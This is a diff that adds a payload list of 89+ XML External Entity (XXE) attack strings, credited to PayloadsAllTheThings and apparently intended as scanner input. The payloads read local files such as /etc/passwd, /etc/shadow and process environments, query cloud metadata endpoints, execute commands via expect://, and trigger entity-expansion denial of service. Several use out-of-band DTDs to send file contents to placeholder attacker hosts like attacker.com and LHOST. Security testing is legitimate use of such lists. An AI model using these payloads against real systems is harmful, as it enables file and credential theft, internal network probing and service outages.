@@ -1,0 +1,94 @@
+# XML External Entity (XXE) payloads
+# Source: https://github.com/swisskyrepo/PayloadsAllTheThings
+# Total: 89 payloads
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://LHOST/xxe">%xxe;]><foo>test</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://LHOST/?x=%file;'>">%eval;%exfil;]><foo/>
+<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY file SYSTEM "file:///etc/passwd">
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+<!ENTITY % xxe PUBLIC "Random Text" "URL">
+<!ENTITY xxe PUBLIC "Any TEXT" "URL">
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+<!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt" >
+<!ENTITY a0 "dos" >
+<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+<!DOCTYPE r [
+<!ENTITY % pe_1 "<!---->">
+<!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
+<!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
+<!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
+<!DOCTYPE root [
+<!ENTITY % local_dtd SYSTEM "file:///abcxyz/">
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
+<!ENTITY % constant 'aaa)>
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
+<?xml version="1.0" ?>
+<!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; leak SYSTEM '%data;:///'>">
+<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
+<!DOCTYPE root [<!ENTITY test SYSTEM 'http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net'>]>
+<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
+<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
+<!ENTITY % file SYSTEM "file:///sys/power/image_size">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
+<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<!DOCTYPE svg [
+<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
+<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
+<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
+<!ENTITY % d SYSTEM "file:///etc/passwd">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://my.evil-host.com/x=%payload;">'>
+
+# ── Round-2 additions (2026-10-29): modern/unique payloads, deduped vs existing ──
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
+<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>
+<!DOCTYPE r [<!ENTITY % p SYSTEM "http://127.0.0.1:8000/notscan.dtd">%p;]><r/>
+<!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>
+<!DOCTYPE r [<!ENTITY x SYSTEM "expect://id">]><r>&x;</r>
+<!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>
+<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd" >]><r a="&x;"/>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo><![CDATA[<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>]]></foo></soap:Body></soap:Envelope>
+<!DOCTYPE r [<!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'file:///etc/passwd'>">%a;%b;]><r>&b;</r>
+<!DOCTYPE r SYSTEM "http://127.0.0.1:8000/notscan.dtd"><r/>
+<!DOCTYPE r [<!ENTITY n "NOTSCAN_XXE">]><r>&n;</r>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><r>&xxe;</r>
+<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
